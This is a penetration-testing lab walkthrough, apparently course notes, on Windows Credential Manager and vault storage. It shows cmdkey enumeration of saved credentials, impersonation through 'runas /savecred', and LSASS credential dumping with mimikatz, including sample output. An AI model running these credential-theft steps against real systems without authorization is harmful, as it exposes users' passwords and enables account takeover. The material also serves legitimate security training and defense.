## Windows Vault and Credential Manager

`Credential Manager` has been part of Windows since `Server 2008 R2` and `Windows 7`. Its internal design isn’t fully documented, but its purpose is to give users and applications a secure place to store credentials used for accessing other systems or services across the `network` or the `internet`. These stored credentials can include `authentication tokens`, `passwords`, `RDP` details, `SMB` access data, and other `protocol`-dependent secrets.

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a `Policy.vpol` file that holds the `AES-128` or `AES-256` keys responsible for encrypting the `stored credentials`. These keys are themselves protected by `DPAPI`, which manages their `encryption and decryption` based on the user’s logon secrets. Newer versions of `Windows` add another layer of defense through `Credential Guard`, which isolates the `DPAPI` master keys inside secured memory enclaves using `Virtualization-based Security` to reduce the chance of `extraction by attackers.`

`Microsoft` often refers to the protected stores as `Credential Lockers` (formerly `Windows Vaults`).` Credential Manager` is the user-facing feature/API, while the actual `encrypted stores` are the `vault/locker` folders.

| Name                  | Description                                                                                                                                                                     |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Web Credentials`     | `Credentials` associated with websites and online accounts. This `locker` is used by Internet Explorer and legacy versions of Microsoft Edge.                                   |
| `Windows Credentials` | Used to store `login tokens` for various `services` such as `OneDrive`, and `credentials` related to `domain users, local network resources, services, and shared directories.` |
It is possible to export `Windows Vaults` into `.crd` files using either the `Control Panel` interface or a command-line operation. These `exported backups` are `encrypted with a password provide`d by the user and can be imported into other `Windows` systems.

```powershell
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

![[{BD80F863-EE6E-49F0-BFC0-4C205E9816B2}.png]]

---
## Enumerating credentials with cmdkey

We can use `cmdkey` to enumerate the credentials stored in the current user's profile:

```powershell
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

`Stored credentials` are listed with the following format:

| Key           | Value                                                                                                                                                      |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Target`      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                                        |
| `Type`        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                                  |
| `User`        | The user account associated with the credential.                                                                                                           |
| `Persistence` | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots. |
The first credential in the output, `virtualapp/didlogical`, is a generic credential tied to `Microsoft` account and `Windows Live` services. The unusual username is just an internal `account ID`, so it can be ignored in this context.

The second credential, `Domain:interactive=SRV01\mcharles`, represents a domain credential linked to the user `SRV01\mcharles`. The `interactive` label shows that this credential is meant for an `interactive logon session`, meaning it’s used when the user logs in directly through the console, `RDP`, or any session where a full desktop environment is created. When this type of credential appears, it can typically be used to impersonate the stored user through the `runas` command to execute processes under that identity.

```powershell
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

![[{CD0DB860-A3BD-4619-A38D-E7DC3B2D61FA}.png]]

---
## Extracting credentials with Mimikatz

There are many tools that can be used to `decrypt stored credentials`, and one of the most common is `mimikatz`. Inside `mimikatz` there are multiple ways to `attack` these stored secrets. One option is `dumping credentials` directly from memory using the `sekurlsa` module, which targets the `LSASS` process to pull live `authentication` data such as `NTLM hashes`, `Kerberos tickets`, and `DPAPI`-related material. Another option is using the `dpapi` module to manually decrypt credential files by recovering their `DPAPI masterkey`.

For this situation, the method is to attack the `LSASS` process with the `sekurlsa` module, since it lets us extract in-memory `credentials`, `tokens`, `logon sessions`, and other `security` artifacts without needing to manually parse `DPAPI`-encrypted files.

```powershell
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```
